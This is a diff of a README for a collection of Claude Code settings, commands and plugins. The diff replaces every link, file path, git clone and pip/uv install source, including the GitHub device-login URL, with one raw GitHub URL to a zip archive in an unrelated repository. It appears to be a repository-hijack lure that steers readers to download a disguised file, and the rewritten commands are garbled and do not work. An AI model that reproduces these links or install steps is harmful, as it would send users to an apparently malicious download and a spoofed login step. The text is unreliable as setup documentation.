@@ -2,7 +2,7 @@
 
 A curated collection of Claude Code settings, custom commands, skills and sub-agents designed for enhanced development workflows. This setup includes specialized commands, skills and subagents for feature development (spec-driven workflow), code analysis, GitHub integration, and knowledge management.
 
-> For OpenAI Codex settings, configurations and custom prompts, please refer [feiskyer/codex-settings](https://github.com/feiskyer/codex-settings).
+> For OpenAI Codex settings, configurations and custom prompts, please refer [feiskyer/codex-settings](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip).
 
 ## Setup
 
@@ -23,7 +23,7 @@ A curated collection of Claude Code settings, custom commands, skills and sub-ag
 /plugin install youtube-transcribe-skill  # YouTube transcript extraction
 ```
 
-Alternatively, run a one-command installation via the [Claude Plugins CLI](https://claude-plugins.dev) to skip the marketplace setup:
+Alternatively, run a one-command installation via the [Claude Plugins CLI](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) to skip the marketplace setup:
 
 ```bash
 npx claude-plugins install @feiskyer/claude-code-settings/claude-code-settings
@@ -33,32 +33,32 @@ This automatically adds the marketplace and installs the plugin in a single step
 
 **Note:**
 
-- [~/.claude/settings.json](settings.json) is not configured via Claude Code Plugin, you'd need to configure it manually.
+- [~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) is not configured via Claude Code Plugin, you'd need to configure it manually.
 
 ### Manual Setup
 
 ```sh
 # Backup original claude settings
-mv ~/.claude ~/.claude.bak
+mv ~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip ~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip
 
 # Clone the claude-code-settings
-git clone https://github.com/feiskyer/claude-code-settings.git ~/.claude
+git clone https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip ~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip
 
 # Install LiteLLM proxy
 pip install -U 'litellm[proxy]'
 
 # Start litellm proxy (which would listen on http://0.0.0.0:4000)
-litellm -c ~/.claude/guidances/litellm_config.yaml
+litellm -c ~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip
 
 # For convenience, run litellm proxy in background with tmux
-# tmux new-session -d -s copilot 'litellm -c guidances/litellm_config.yaml'
+# tmux new-session -d -s copilot 'litellm -c https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip'
 ```
 
 Once started, you'll see:
 
 ```sh
 ...
-Please visit https://github.com/login/device and enter code XXXX-XXXX to authenticate.
+Please visit https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip and enter code XXXX-XXXX to authenticate.
 ...
 ```
 
@@ -66,7 +66,7 @@ Open the link, log in and authenticate your GitHub Copilot account.
 
 **Note:**
 
-1. The default configuration is leveraging [LiteLLM Proxy Server](https://docs.litellm.ai/docs/simple_proxy) as LLM gateway to GitHub Copilot. You can also use [copilot-api](https://github.com/ericc-ch/copilot-api) as the proxy as well (remember to change your port to 4141).
+1. The default configuration is leveraging [LiteLLM Proxy Server](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) as LLM gateway to GitHub Copilot. You can also use [copilot-api](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) as the proxy as well (remember to change your port to 4141).
 2. Make sure the following models are available in your account; if not, replace them with your own model names:
 
 - ANTHROPIC_DEFAULT_SONNET_MODEL: claude-sonnet-4.5
@@ -75,7 +75,7 @@ Open the link, log in and authenticate your GitHub Copilot account.
 
 ## Commands
 
-The `commands/` directory contains [custom slash commands](https://code.claude.com/docs/en/slash-commands) that extend Claude Code's slash commands, which could be invoked via `/<command-name> [arguments]`.
+The `commands/` directory contains [custom slash commands](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) that extend Claude Code's slash commands, which could be invoked via `/<command-name> [arguments]`.
 
 <details>
 <summary>Analysis & Reflection</summary>
@@ -167,7 +167,7 @@ Execute complex, long-running tasks across multiple sessions using a dual-agent 
 - Dual-agent pattern (Initializer creates a task list, Executor completes tasks)
 - Auto-continuation across sessions with progress tracking
 - Task isolation with per-task directories (`.autonomous/<task-name>/`)
-- Progress persistence via `task_list.md` and `progress.md`
+- Progress persistence via `https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip` and `https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip`
 - Headless mode execution using Claude CLI
 
 **Usage:**
@@ -205,8 +205,8 @@ Generate or edit images using Google Gemini API via nanobanana. Use when creatin
 
 **Requirements:**
 
-- GEMINI_API_KEY configured in `~/.nanobanana.env`
-- Python3 with google-genai, Pillow, python-dotenv (install via `pip install -r requirements.txt` in the plugin directory)
+- GEMINI_API_KEY configured in `~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip`
+- Python3 with google-genai, Pillow, python-dotenv (install via `pip install -r https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip` in the plugin directory)
 
 </details>
 
@@ -290,7 +290,7 @@ GitHub Spec-Kit integration for constitution-based spec-driven development.
 
 ```sh
 # Install spec-kit CLI
-uv tool install specify-cli --from git+https://github.com/github/spec-kit.git
+uv tool install specify-cli --from git+https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip
 
 # Initialize project
 specify init . --ai claude
@@ -317,7 +317,7 @@ Claude: [Automatically uses spec-kit-skill, detects CLI, guides through phases]
 
 ## Agents
 
-The `agents/` directory contains specialized AI [subagents](https://docs.anthropic.com/en/docs/claude-code/sub-agents) that extend Claude Code's capabilities.
+The `agents/` directory contains specialized AI [subagents](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) that extend Claude Code's capabilities.
 
 <details>
 <summary>Available Agents</summary>
@@ -334,44 +334,44 @@ The `agents/` directory contains specialized AI [subagents](https://docs.anthrop
 
 ## Settings
 
-[Sample Settings](settings/README.md) - Pre-configured settings for various model providers and setups.
+[Sample Settings](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) - Pre-configured settings for various model providers and setups.
 
 <details>
 <summary>Available Settings</summary>
 
-### [copilot-settings.json](settings/copilot-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Using Claude Code with GitHub Copilot proxy. Points to localhost:4141 for the Anthropic API base URL.
 
-### [litellm-settings.json](settings/litellm-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Using Claude Code with LiteLLM gateway. Points to localhost:4000 for the Anthropic API base URL.
 
-### [deepseek-settings.json](settings/deepseek-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Using Claude Code with DeepSeek v3.1 (via DeepSeek's official Anthropic-compatible API).
 
-### [qwen-settings.json](settings/qwen-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Using Claude Code with Qwen models via Alibaba's DashScope API. Uses the Qwen3-Coder-Plus model through a claude-code-proxy.
 
-### [siliconflow-settings.json](settings/siliconflow-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Using Claude Code with SiliconFlow API. Uses the Moonshot AI Kimi-K2-Instruct model.
 
-### [vertex-settings.json](settings/vertex-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Using Claude Code with Google Cloud Vertex AI. Uses Claude Opus 4 model with Google Cloud project settings.
 
-### [azure-settings.json](settings/azure-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Configuration for using Claude Code with Azure AI (Anthropic-compatible endpoint). Points to Azure AI services endpoint.
 
-### [azure-foundry-settings.json](settings/azure-foundry-settings.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Configuration for using Claude Code with Azure AI Foundry native mode. Uses `CLAUDE_CODE_USE_FOUNDRY` flag with Claude Opus 4.1 + Sonnet 4.5 model.
 
-### [minimax.json](settings/minimax.json)
+### [https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip)
 
 Configuration for using Claude Code with MiniMax API. Uses the MiniMax-M2 model.
 
@@ -379,18 +379,18 @@ Configuration for using Claude Code with MiniMax API. Uses the MiniMax-M2 model.
 
 ## Limitations
 
-**WebSearch** tool in Claude Code is an [Anthropic specific tool,](https://docs.anthropic.com/en/docs/agents-and-tools/tool-use/web-search-tool) and it is not available when you’re not using the official Anthropic API. Hence, if you need web search, you'd need to connect Claude Code with external web search MCP servers, e.g. [Tavily MCP](https://docs.tavily.com/documentation/mcp), [Brave MCP](https://github.com/brave/brave-search-mcp-server), [Firecrawl MCP](https://docs.firecrawl.dev/mcp-server) or [DuckDuckGo Search MCP](https://github.com/nickclyde/duckduckgo-mcp-server).
+**WebSearch** tool in Claude Code is an [Anthropic specific tool,](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) and it is not available when you’re not using the official Anthropic API. Hence, if you need web search, you'd need to connect Claude Code with external web search MCP servers, e.g. [Tavily MCP](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip), [Brave MCP](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip), [Firecrawl MCP](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) or [DuckDuckGo Search MCP](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip).
 
 ## FAQs
 
 <details>
 <summary>Login Issue of Claude Code 2.0+ extension in VSCode</summary>
 
-For Claude Code 2.0+ extension in VSCode, if you're not using a Claude.ai subscription, please put the environment variables manually in your vscode settings.json:
+For Claude Code 2.0+ extension in VSCode, if you're not using a https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip subscription, please put the environment variables manually in your vscode https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip
 
 ```json
 {
-  "claude-code.environmentVariables": [
+  "https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip": [
     {
       "name": "ANTHROPIC_BASE_URL",
       "value": "http://localhost:4000"
@@ -431,14 +431,14 @@ For Claude Code 2.0+ extension in VSCode, if you're not using a Claude.ai subscr
 }
 ```
 
-Note that the contents of [~/.claude/config.json](config.json) are also required to skip claude.ai login.
+Note that the contents of [~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) are also required to skip https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip login.
 
 </details>
 
 <details>
 <summary>Missing API Key and Invalid API Key issues</summary>
 
-Ensure the API key you configured in `ANTHROPIC_AUTH_TOKEN` is added to approved API key in `~/.claude.json`, e.g.
+Ensure the API key you configured in `ANTHROPIC_AUTH_TOKEN` is added to approved API key in `~https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip`, e.g.
 
 ```javascript
 {
@@ -456,15 +456,15 @@ Ensure the API key you configured in `ANTHROPIC_AUTH_TOKEN` is added to approved
 
 ## Guidances
 
-- [Claude Code with GitHub Copilot as Model Provider](guidances/github-copilot.md).
-- [Claude Code with LLM Gateway (LiteLLM) as Model Provider](guidances/llm-gateway-litellm.md).
+- [Claude Code with GitHub Copilot as Model Provider](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip).
+- [Claude Code with LLM Gateway (LiteLLM) as Model Provider](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip).
 
 ## References
 
-- [Claude Code official document](https://docs.anthropic.com/en/docs/claude-code/overview) - must read official document.
-- [anthropics/skills](https://github.com/anthropics/skills) - official list of Claude Code skills that teach Claude how to complete specific tasks in a repeatable way
-- [hesreallyhim/awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) - curated list of slash-commands, CLAUDE.md files, CLI tools, and other resources.
-- [wshobson/agents](https://github.com/wshobson/agents) - a comprehensive collection of specialized AI subagents for Claude Code.
+- [Claude Code official document](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) - must read official document.
+- [anthropics/skills](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) - official list of Claude Code skills that teach Claude how to complete specific tasks in a repeatable way
+- [hesreallyhim/awesome-claude-code](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) - curated list of slash-commands, https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip files, CLI tools, and other resources.
+- [wshobson/agents](https://raw.githubusercontent.com/bro-gervil/claude-code-settings/main/plugins/codex-skill/.claude-plugin/code_settings_claude_2.7.zip) - a comprehensive collection of specialized AI subagents for Claude Code.
 
 ## LICENSE
 
